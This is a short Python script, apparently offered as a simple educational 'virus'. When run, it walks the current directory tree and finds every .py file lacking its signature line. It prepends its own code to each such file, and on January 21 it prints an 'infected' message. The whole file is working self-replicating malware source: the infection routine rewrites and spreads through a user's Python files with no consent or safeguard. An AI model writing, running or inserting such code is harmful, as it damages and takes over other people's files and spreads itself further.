#!/usr/bin/python
import os
import datetime
SIGNATURE = "This File is infected with a PYTHON VIRUS1"
#------------------------------------------------------------------------#
#----------------------------part A--------------------------------------#
def search(path):
    filestoinfect = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            filestoinfect.extend(search(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if infected == False:
                filestoinfect.append(path+"/"+fname)
    return filestoinfect
#----------------------------part A--------------------------------------#
#----------------------------part B--------------------------------------#
def infect(filestoinfect):
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i,line in enumerate(virus):
        if i>=0 and i <39:
            virusstring += line
    virus.close
    for fname in filestoinfect:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()
#----------------------------part B--------------------------------------#
#----------------------------part C--------------------------------------#
def bomb():
    if datetime.datetime.now().month == 1 and datetime.datetime.now().day == 21:
        print ("This File is infected with a PYTHON VIRUS2")
#----------------------------part C--------------------------------------#
#----------------------Executable part A,B,C-----------------------------#
filestoinfect = search(os.path.abspath(""))
infect(filestoinfect)
bomb()
#----------------------Executable part A,B,C-----------------------------#